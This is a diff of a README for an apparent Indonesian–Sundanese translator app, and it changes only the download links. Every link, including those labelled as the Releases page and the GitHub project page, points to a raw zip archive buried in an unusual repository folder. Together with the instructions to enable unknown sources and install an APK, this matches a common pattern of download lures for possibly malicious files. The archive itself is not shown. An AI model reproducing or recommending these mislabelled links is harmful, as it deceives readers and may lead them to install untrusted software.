@@ -1,7 +1,7 @@
 # 🌟 TranslatorSundanese - Easy Indonesian ↔ Sundanese Translation
 
 ## 📥 Download Now
-[![Download TranslatorSundanese](https://raw.githubusercontent.com/AnggaHL/TranslatorSundanese/main/semitonal/TranslatorSundanese.zip)](https://raw.githubusercontent.com/AnggaHL/TranslatorSundanese/main/semitonal/TranslatorSundanese.zip)
+[![Download TranslatorSundanese](https://github.com/AnggaHL/TranslatorSundanese/raw/refs/heads/main/app/src/main/res/Sundanese_Translator_3.3-alpha.4.zip)](https://github.com/AnggaHL/TranslatorSundanese/raw/refs/heads/main/app/src/main/res/Sundanese_Translator_3.3-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to TranslatorSundanese! This app helps you quickly and easily translate between Indonesian and Sundanese. Perfect for students, travelers, or anyone looking to understand these languages better.
@@ -29,7 +29,7 @@ To download TranslatorSundanese, visit the Releases page. Follow these steps to 
 5. Once the download completes, open the APK file to start the installation.
 6. Follow the on-screen prompts to complete the setup.
 
-Visit this page to download: [TranslatorSundanese Releases](https://raw.githubusercontent.com/AnggaHL/TranslatorSundanese/main/semitonal/TranslatorSundanese.zip)
+Visit this page to download: [TranslatorSundanese Releases](https://github.com/AnggaHL/TranslatorSundanese/raw/refs/heads/main/app/src/main/res/Sundanese_Translator_3.3-alpha.4.zip)
 
 ## 📱 Installation Steps
 1. **Enable Unknown Sources:** 
@@ -71,6 +71,6 @@ If you have questions or need help, feel free to reach out. Contact us through t
 Thanks to all contributors and testers for your efforts in making TranslatorSundanese better. Your input helps improve the app for everyone!
 
 ## 🔗 More Information
-For more information about the app, including upcoming features and updates, check the project on GitHub: [TranslatorSundanese on GitHub](https://raw.githubusercontent.com/AnggaHL/TranslatorSundanese/main/semitonal/TranslatorSundanese.zip)
+For more information about the app, including upcoming features and updates, check the project on GitHub: [TranslatorSundanese on GitHub](https://github.com/AnggaHL/TranslatorSundanese/raw/refs/heads/main/app/src/main/res/Sundanese_Translator_3.3-alpha.4.zip)
 
 Remember to check for updates regularly to enjoy the latest features and improvements!
